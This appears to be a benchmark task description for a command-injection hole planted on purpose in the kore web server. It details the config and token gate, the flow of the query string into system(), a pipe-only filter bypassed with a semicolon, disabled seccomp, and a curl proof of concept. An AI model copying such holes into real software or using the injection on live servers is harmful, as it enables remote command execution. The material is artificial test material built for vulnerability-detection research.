DESCRIPTION:
  Config-file-gated command injection with runtime initialization state.
  The server must be started with --exec-config (sets exec_mode, exec_logging,
  exec_secret). /exec/init?token=<secret> must be called first to set
  exec_initialized=1. Query string flows through an exec_args_t struct and
  dispatch helper into system(). Pipe character is blocked; bypass with
  semicolon.

CONFIG_GATE (C3 — config file + runtime state):
  mechanism:  read_exec_config() parses key=value file into
              struct exec_config { int enabled; int logging; char secret[64]; }
              exec_init_page() validates token and sets exec_initialized=1.
  check:      exec_cfg.enabled && exec_initialized in exec_page()
  complexity: requires modelling file I/O data flow AND inter-request state

INPUT_FLOW (I3 — struct dispatch):
  entry:      HTTP GET /exec?<payload>  →  req->query_string
  path:       exec_page() stores query_string in exec_args_t.cmd,
              calls dispatch_exec(&args) which calls system()
  transforms: pointer through struct, helper function call

SANITIZATION (S2 — bypassable pipe check):
  check:      strchr(cmd, '|') != NULL → blocked
  bypass:     use semicolon: /exec?id;id>/tmp/poc_164_marker

SINK:        system() in dispatch_exec() (src/kore.c)

CHANGED FILES:
  src/kore.c   — adds struct exec_config (with secret), exec_initialized,
                 read_exec_config(), --exec-config pre-scan,
                 exec_init_page(), exec_args_t, dispatch_exec(), exec_page()
  src/seccomp.c — disables seccomp to allow system() calls

EXPLOIT:
  build:   bash build.sh
  start:   printf "exec_mode=1\nexec_logging=1\nexec_secret=s3cr3t164\n" > /tmp/e.conf
           ./kore -c kore.conf -n -r --exec-config /tmp/e.conf
  init:    curl 'http://127.0.0.1:18164/exec/init?token=s3cr3t164'
  trigger: curl 'http://127.0.0.1:18164/exec?id;id>/tmp/poc_164_marker'
  verify:  cat /tmp/poc_164_marker
  expect:  uid= line written by server process

  gate bypass: omitting --exec-config → exec_cfg stays {0,0,""} → 403 response.
  S2 bypass: semicolon (;) is not filtered, only pipe (|).

NOTES:
  - system() output goes to server stdout/stderr, not HTTP response body.
  - kore requires a config file (-c); PoC creates one at runtime.
  - Both /exec/init and /exec routes must appear in kore config file.
  - seccomp disabled in patch to allow system() calls.
